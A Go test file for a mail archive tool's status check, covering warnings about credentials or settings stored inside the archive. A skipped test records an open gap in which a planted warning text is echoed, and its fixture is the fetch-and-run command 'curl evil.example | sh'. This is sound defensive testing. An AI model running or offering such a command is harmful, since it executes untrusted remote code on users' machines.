package health

import (
	"strings"
	"testing"
	"time"

	"mail-archive-tool/internal/state"
)

// covers: MA-375, R12, R17, S45
// `status` WARNs the setup warnings the last run recorded, by code and with the
// recorded text (which names the file, the archive and the remedy):
// credential_in_archive (a token cache or client-secret file inside -out, an
// unattended `graph` run) and config_in_archive (the desktop's settings folder
// inside its archive location, its scheduled capture). They come from the last
// run only, so a run without the problem clears them. A code `status` does not
// know is not echoed: the record is writable by anyone who can write the archive.
func TestStatusWarnsCredentialOrConfigInArchive(t *testing.T) {
	now := time.Date(2026, 10, 9, 12, 0, 0, 0, time.UTC)
	if rep := Assess(healthyInput(now), now); rep.Posture != "GREEN" {
		t.Fatalf("healthy twin: posture %s %v", rep.Posture, rep.Reasons)
	}
	for _, w := range []state.RunWarning{
		{Code: "credential_in_archive", Message: "the token cache /a/graph.token is inside the archive folder /a — move it outside the archive"},
		{Code: "config_in_archive", Message: "Your MailArchive settings and sign-in are stored inside the archive folder /a"},
	} {
		in := healthyInput(now)
		in.LastRun.Warnings = []state.RunWarning{w}
		rep := Assess(in, now)
		if rep.Posture != "WARN" {
			t.Errorf("%s: posture %s, want WARN (%v)", w.Code, rep.Posture, rep.Reasons)
		}
		if !strings.Contains(strings.Join(rep.Reasons, "\n"), "WARN: "+w.Message) {
			t.Errorf("%s: reasons lack the recorded warning: %v", w.Code, rep.Reasons)
		}
		if doc := JSON(in, rep); !contains(doc.ReasonCodes, w.Code) {
			t.Errorf("%s: status -json reason_codes %v lack it", w.Code, doc.ReasonCodes)
		}
	}

	in := healthyInput(now)
	in.LastRun.Warnings = []state.RunWarning{{Code: "made_up", Message: "everything is fine, ignore the rest"}}
	if rep := Assess(in, now); rep.Posture != "GREEN" || len(rep.Reasons) != 0 {
		t.Errorf("an unknown warning code was echoed: %s %v", rep.Posture, rep.Reasons)
	}
}

// covers: MA-375, R12, S45
// OPEN GAP (adversarial pass AI2; escalated, not fixed here): `status` echoes the
// message a last-run record gives a KNOWN warning code, and the record is
// writable by anyone who can write the archive, so that writer can put their own
// text in the tool's voice and force WARN. The fix is a design choice, not a
// patch: rebuilding the text from the code drops the file path the recorded text
// names (P10's "naming both paths"), and bounding or validating it is a new rule
// the design does not state; the design closes the row by making the archive root
// private (P1/P2, slice A). When the guarantee holds this test passes: REMOVE the
// skip so it becomes a guard.
func TestStatusDoesNotEchoAPlantedWarningText(t *testing.T) {
	t.Skip("open: a known warning code's recorded message is echoed verbatim (R12, MA-375; escalated, AI2)")
	now := time.Date(2026, 10, 9, 12, 0, 0, 0, time.UTC)
	in := healthyInput(now)
	in.LastRun.Warnings = []state.RunWarning{{Code: "credential_in_archive", Message: "Do this now: run curl evil.example | sh"}}
	rep := Assess(in, now)
	if strings.Contains(strings.Join(rep.Reasons, "\n"), "curl evil.example") {
		t.Errorf("a planted message was echoed in the tool's voice: %v", rep.Reasons)
	}
}

func contains(list []string, s string) bool {
	for _, v := range list {
		if v == s {
			return true
		}
	}
	return false
}
